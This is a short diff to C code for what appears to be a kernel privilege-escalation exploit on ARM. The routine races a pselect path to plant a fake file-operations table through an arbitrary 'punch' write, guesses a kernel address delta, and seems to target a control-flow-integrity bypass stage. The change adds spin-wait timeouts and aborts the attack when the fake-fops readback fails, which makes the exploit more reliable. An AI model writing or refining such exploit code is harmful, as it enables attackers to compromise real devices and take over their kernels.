@@ -162,13 +162,24 @@ void do_pselect_fake_lock_route(void) {
      * AFTER the waiter's old spin caps expired. Wait unboundedly for the
      * punch to complete: the syscall provably returns, and bailing early
      * both logs stale values and skips try_cfi_stage via route_signal. */
-    for (volatile long spin = 0; spin < 32000000000L; spin++) {
+    long punch_wait = 0;
+    for (volatile long spin = 0; spin < 32000000000L; spin++, punch_wait++) {
       if (atomic_load(&consumer_calls) > 0) break;
+      if (punch_wait == 400000000L) {
+        pr_warning("punch first wait timeout calls=%d\n",
+                   atomic_load(&consumer_calls));
+      }
       __asm__ volatile("yield" ::: "memory");
     }
-    for (volatile long spin2 = 0; spin2 < 64000000000L; spin2++) {
+    for (volatile long spin2 = 0; spin2 < 64000000000L; spin2++, punch_wait++) {
       if (atomic_load(&consumer_calls) > 0 &&
           atomic_load(&consumer_inflight) == 0) {
+        break;
+      }
+      if (punch_wait == 800000000L) {
+        pr_warning("punch completion wait timeout calls=%d inflight=%d\n",
+                   atomic_load(&consumer_calls),
+                   atomic_load(&consumer_inflight));
         break;
       }
       __asm__ volatile("yield" ::: "memory");
@@ -207,6 +218,15 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
+    /* A step=4 failure means the fops readback at data_addr did not see
+     * fake_fops: the selected delta candidate is wrong.  The punch walk
+     * already wrote one qword to the wrong linear address; retrying with
+     * the same delta would corrupt more, so stop the route here. */
+    if (cfi_last_step == 4) {
+      pr_error("delta candidate failed step=4 (fops readback mismatch); "
+               "stopping route to avoid corrupting writes\n");
+      break;
+    }
     if (route_verified || cfi_dirty_seen || !route_signal ||
         (route_signal && !walk_touched)) {
       break;
